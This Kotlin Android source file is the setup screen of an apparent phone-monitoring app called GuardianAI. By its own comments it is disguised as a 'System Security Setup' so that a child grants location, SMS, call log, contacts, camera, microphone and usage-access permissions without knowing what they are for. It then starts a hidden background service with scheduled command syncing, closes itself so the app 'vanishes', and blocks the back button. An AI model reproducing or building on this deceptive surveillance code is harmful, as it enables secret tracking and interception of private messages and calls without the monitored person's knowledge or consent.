package com.guardianai.agent.setup

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.widget.*
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.guardianai.agent.config.Config
import com.guardianai.agent.services.GuardianService
import com.guardianai.agent.utils.DeviceInfo
import com.guardianai.agent.workers.CommandSyncWorker

/**
 * SetupActivity — Disguised as "System Security Setup"
 *
 * Child sees a legitimate-looking setup screen.
 * Quietly grants all permissions and starts the guardian service.
 *
 * Launch via link:
 *   guardianai://setup?child_id=UUID&family_id=UUID
 *
 * Or via ADB:
 *   adb shell am start -n com.guardianai.agent/.setup.SetupActivity
 *     --es child_id "UUID"
 */
class SetupActivity : Activity() {

    companion object {
        private val PERMISSIONS = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        private const val REQUEST_CODE = 1001
        private const val REQUEST_BG_LOCATION = 1002
    }

    private lateinit var tvTitle: TextView
    private lateinit var tvStatus: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var tvStep: TextView
    private var childId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make it look like a system screen
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

        // Build the "System Setup" UI programmatically
        buildUI()

        // Get child_id from intent or deep link
        childId = intent.getStringExtra("child_id")
            ?: intent.data?.getQueryParameter("child_id")

        // Save child ID
        if (!childId.isNullOrBlank()) {
            DeviceInfo.saveChildId(this, childId!!)
        }

        // Start the setup flow
        Handler(Looper.getMainLooper()).postDelayed({
            startSetupFlow()
        }, 1500)
    }

    private fun buildUI() {
        // Root layout
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF1a1a2e.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(60, 80, 60, 80)
        }

        // Shield icon
        val icon = TextView(this).apply {
            text = "🛡️"
            textSize = 64f
            gravity = android.view.Gravity.CENTER
            setPadding(0, 0, 0, 24)
        }

        // Title
        tvTitle = TextView(this).apply {
            text = "Security Setup"
            textSize = 26f
            setTextColor(0xFFFFFFFF.toInt())
            gravity = android.view.Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, 8)
        }

        // Subtitle
        val subtitle = TextView(this).apply {
            text = "Setting up device protection..."
            textSize = 14f
            setTextColor(0xFFAAAAAA.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 0, 0, 40)
        }

        // Progress bar
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 8
            )
            max = 100
            progress = 10
            progressTintList = android.content.res.ColorStateList.valueOf(0xFF667eea.toInt())
            progressBackgroundTintList = android.content.res.ColorStateList.valueOf(0xFF333355.toInt())
        }

        // Step text
        tvStep = TextView(this).apply {
            text = "Initializing..."
            textSize = 13f
            setTextColor(0xFF8888AA.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 16, 0, 0)
        }

        // Status text
        tvStatus = TextView(this).apply {
            text = ""
            textSize = 12f
            setTextColor(0xFF4ade80.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 8, 0, 0)
        }

        root.addView(icon)
        root.addView(tvTitle)
        root.addView(subtitle)
        root.addView(progressBar)
        root.addView(tvStep)
        root.addView(tvStatus)
        setContentView(root)
    }

    private fun startSetupFlow() {
        updateUI(20, "Checking permissions...")

        // Request all permissions at once
        val missing = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            continueSetup()
        } else {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE) {
            // Request background location separately (Android requires it)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (ContextCompat.checkSelfPermission(
                        this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
                    ) != PackageManager.PERMISSION_GRANTED
                ) {
                    updateUI(50, "Enabling background tracking...")
                    ActivityCompat.requestPermissions(
                        this,
                        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                        REQUEST_BG_LOCATION
                    )
                    return
                }
            }
            continueSetup()
        } else if (requestCode == REQUEST_BG_LOCATION) {
            continueSetup()
        }
    }

    private fun continueSetup() {
        updateUI(60, "Configuring protection features...")

        Handler(Looper.getMainLooper()).postDelayed({
            requestSpecialPermissions()
        }, 800)
    }

    private fun requestSpecialPermissions() {
        // Request Usage Access (PACKAGE_USAGE_STATS)
        if (!hasUsageAccess()) {
            updateUI(65, "Enable 'Usage Access' for app monitoring...")
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            // Continue after 3 seconds regardless
            Handler(Looper.getMainLooper()).postDelayed({
                requestBatteryOptimization()
            }, 3000)
        } else {
            requestBatteryOptimization()
        }
    }

    private fun requestBatteryOptimization() {
        updateUI(75, "Optimizing battery settings...")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(android.os.PowerManager::class.java)
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        Handler(Looper.getMainLooper()).postDelayed({
            finalizeSetup()
        }, 1500)
    }

    private fun finalizeSetup() {
        updateUI(90, "Starting protection service...")

        // Start Guardian Service
        val serviceIntent = Intent(this, GuardianService::class.java).apply {
            putExtra("child_id", childId ?: "")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // Schedule periodic sync
        CommandSyncWorker.schedule(this)

        Handler(Looper.getMainLooper()).postDelayed({
            updateUI(100, "✓ Protection active")
            tvStatus.text = "Your device is now protected."
            tvTitle.text = "Setup Complete ✓"

            // Close after 2 seconds — app vanishes, service runs hidden
            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 2000)
        }, 1000)
    }

    private fun updateUI(progress: Int, step: String) {
        progressBar.progress = progress
        tvStep.text = step
    }

    private fun hasUsageAccess(): Boolean {
        return try {
            val am = getSystemService(android.app.AppOpsManager::class.java)
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                am.unsafeCheckOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), packageName
                )
            } else {
                @Suppress("DEPRECATION")
                am.checkOpNoThrow(
                    android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), packageName
                )
            }
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
    }

    // Prevent back button from closing setup
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // Ignore — setup must complete
    }
}
